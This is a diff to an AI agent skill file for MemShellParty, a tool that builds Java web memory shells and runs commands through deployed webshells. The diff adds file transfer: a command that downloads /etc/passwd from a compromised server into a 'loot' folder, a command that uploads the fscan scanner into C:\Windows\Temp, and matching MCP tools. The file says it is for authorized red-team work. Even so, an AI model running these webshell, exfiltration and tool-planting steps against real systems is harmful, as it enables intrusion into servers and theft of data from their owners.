@@ -1,6 +1,6 @@
 ---
 name: memshell-party
-description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, and run commands on them with `memparty exec`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, or execute commands on a Godzilla / Behinder shell — for authorized security testing, red-team engagements, or research only.
+description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, run commands on them with `memparty exec`, and transfer files with `memparty upload`/`memparty download`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, execute commands on a Godzilla / Behinder shell, or move files through one — for authorized security testing, red-team engagements, or research only.
 ---
 
 # MemShellParty skill
@@ -18,8 +18,8 @@ Two equivalent interfaces — pick whichever is available:
 - **CLI**: `memparty <command> [flags]` (install: `npm install -g memshell-party-cli`, or `npx memshell-party-cli`).
 - **MCP tools** (if the `memshell-party` MCP server is connected): `list_servers`, `list_config`,
   `list_packers`, `list_command_configs`, `generate_memshell`, `generate_probe`, `parse_classname`,
-  `server_version`, `connect_test`, `exec_command`, `target_save`, `target_note`, `target_list`,
-  `target_remove`, `log_list`.
+  `server_version`, `connect_test`, `exec_command`, `download_file`, `upload_file`, `target_save`,
+  `target_note`, `target_list`, `target_remove`, `log_list`.
 
 The CLI is the source of truth for examples below; MCP tool args mirror the CLI flags
 (`-s/--server` → `server`, `-t/--tool` → `shellTool`, `-y/--type` → `shellType`, `-p/--packer` → `packer`).
@@ -192,7 +192,35 @@ memparty exec -u <shell-url> -t behinder --pass rebeyond \
 Over MCP this is the `exec_command` tool (`url`, `tool`, `command`, `pass`/`key`, `os`,
 `headerName`/`headerValue`).
 
-## Step 6 — Save targets, switch by name
+## Step 6 — Transfer files
+
+`memparty upload` / `memparty download` move files through a Godzilla / Behinder shell (the
+real protocol — chunked, with integrity verification: remote size for Godzilla, MD5 for
+Behinder). Same credentials and gate header as `exec`:
+
+```bash
+memparty download -u <shell-url> -t godzilla --pass pass --key key \
+  --header-name User-Agent --header-value <headerValue-from-gen-json> \
+  /etc/passwd -o loot/passwd
+memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
+```
+
+- Download refuses to overwrite an existing local file unless `--force`; `-o` naming a
+  directory keeps the remote basename; no `-o` means `./<basename>`.
+- Upload overwrites the remote path (truncate + write), max 64 MiB per file; a failed
+  upload warns that the remote file may be partial.
+- Godzilla transfers cap at 2 GiB (payload int limit); downloads are buffered in memory.
+- Non-ASCII remote paths: fine on Behinder as-is. On Godzilla the path is decoded by the
+  server's platform charset — UTF-8 on JDK 18+/Linux; for old JDK (8/11/17) on Chinese
+  Windows pass `--remote-charset GBK` (MCP: `remoteCharset`).
+- `--json` returns `{ ok, tool, url, direction, remotePath, localPath, bytes, durationMs }` —
+  file bytes never travel over MCP/stdout.
+
+Over MCP these are the `download_file` (`remotePath`, optional `localPath`, `force`) and
+`upload_file` (`localPath`, `remotePath`) tools, plus the usual connection fields. The local
+paths are on the machine running the MCP server.
+
+## Step 7 — Save targets, switch by name
 
 Flag soup gets old fast. Save each working shell into a **project** (a named group of shells
 with an optional remark and category), then reference it as `<project>/<shell>`:
@@ -212,10 +240,11 @@ MCP equivalents: `target_save` (project, shell, url, tool, creds, `projectRemark
 `name: "<project>/<shell>"` to `connect_test` / `exec_command`.
 The store lives at `~/.memparty/targets.json`.
 
-## Step 7 — Audit with the operation log
+## Step 8 — Audit with the operation log
 
-Every operation (gen, probe, connect, exec, save/note/remove) is appended to
-`~/.memparty/operations.jsonl` — no credentials, no payload bytes; exec output is truncated.
+Every operation (gen, probe, connect, exec, download, upload, save/note/remove) is appended to
+`~/.memparty/operations.jsonl` — no credentials, no payload bytes, no file contents; exec output
+is truncated.
 Query it to recall what was done against a target:
 
 ```bash
